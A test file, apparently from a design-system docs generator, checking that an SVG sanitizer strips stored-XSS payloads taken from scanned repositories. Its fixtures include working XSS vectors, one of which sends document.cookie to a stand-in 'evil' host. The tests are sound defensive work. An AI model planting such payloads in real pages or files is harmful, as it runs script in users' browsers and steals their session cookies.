...
describe("mined SVG is sanitized before inlining (stored-XSS guard)", () => {
  // The icon showcase inlines mined markup via dangerouslySetInnerHTML, and
  // that markup comes from the *scanned target codebase* — untrusted input. A
  // hostile repo shipping `<svg onload=…>` previously executed script in the
  // user's browser when they opened the generated Storybook docs.
  const ATTACKS: Array<[string, string]> = [
    [
      "inline event handler",
      `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://evil/?c='+document.cookie)"><path d="M0 0h24v24H0z"/></svg>`,
    ],
    [
      "inline <script>",
      `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><path d="M1 1"/></svg>`,
    ],
    [
      "<foreignObject> HTML smuggling",
      `<svg><foreignObject><img src=x onerror="alert(1)"></foreignObject><path d="M1 1"/></svg>`,
    ],
    [
      "SMIL attribute injection",
      `<svg><set attributeName="onload" to="alert(1)"/><animate attributeName="href" values="javascript:alert(1)"/><path d="M1 1"/></svg>`,
    ],
    [
      "javascript: href",
    ...
    [
      "remote xlink:href",
      `<svg><use xlink:href="http://evil/x.svg#a"/><path d="M1 1"/></svg>`,
    ],
    [
      "unquoted handler attribute",
      `<svg><circle cx=5 cy=5 r=4 onclick=alert(1) fill=red /></svg>`,
    ],
    [
      "mixed-case handler and element",
      `<svg OnLoAd="alert(1)"><SCRIPT>alert(2)</SCRIPT><path d="M1 1"/></svg>`,
    ],
  ];

  it.each(ATTACKS)("neutralizes %s", (_label, payload) => {
    const out = sanitizeSvg(payload) ?? "";
    // Assert on attribute NAMES, not raw substrings: an inert `data-*` value
    // that merely contains the text "onload=" is not an event handler.
    const attrNames = [...out.matchAll(/[\s<]([a-zA-Z_:][\w:.-]*)\s*=/g)].map(
      (m) => m[1].toLowerCase(),
    );
    expect(attrNames.some((n) => n.startsWith("on"))).toBe(false);
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/<foreignobject/i);
    expect(out).not.toMatch(/<(set|animate)\b/i);
    expect(out).not.toMatch(/javascript:/i);
    expect(out).not.toMatch(/(?:xlink:)?href\s*=\s*"(?!#)/i);
  });

  it("keeps inert attributes whose values merely look like handlers", () => {
    const out = sanitizeSvg(
      `<svg><path d="M1 1" data-x="onload=alert(1)"/></svg>`,
    );
    expect(out).toContain(`data-x="onload=alert(1)"`);
  });

  it("preserves benign icon markup and case-sensitive attribute names", () => {
    const out = sanitizeSvg(
      `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor"><defs><linearGradient id="g"><stop offset="0%" stop-color="#fff"/></linearGradient></defs><rect width="24" height="24" fill="url(#g)"/></svg>`,
    );
    // `viewBox`/`linearGradient` are case-sensitive in XML — lowercasing them
    // would leave rendering dependent on the HTML parser's SVG fixup table.
  ...
  it("drops markup entirely when the root element cannot survive", () => {
    expect(sanitizeSvg(`<div onclick="alert(1)">not an svg</div>`)).toBeNull();
  });

  // The tests above pin sanitizeSvg's behavior but would stay green if it were
  // simply unhooked from extractFirstSvg. This one goes through the real path —
  // a hostile file on disk → the generated MDX — so the wiring is guarded too.
  it("keeps hostile markup out of the generated Icons MDX end-to-end", async () => {
    const { mkdtempSync, writeFileSync, rmSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const dir = mkdtempSync(join(tmpdir(), "ds-icons-xss-"));
    try {
      writeFileSync(
        join(dir, "evil.svg"),
        `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://evil/?c='+document.cookie)"><script>alert(1)</script><path d="M0 0h24v24H0z"/></svg>`,
      );
      const mdx = generateIconShowcaseMdx([
        {
          icon: { name: "evil", file: "evil.svg", source: "asset" } as never,
          root: dir,
        },
      ]);
      expect(mdx).not.toMatch(/onload/i);
      expect(mdx).not.toMatch(/<script/i);
      expect(mdx).not.toMatch(/document\.cookie/i);
      // The icon should still be rendered, just disarmed.
      expect(mdx).toContain("M0 0h24v24H0z");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
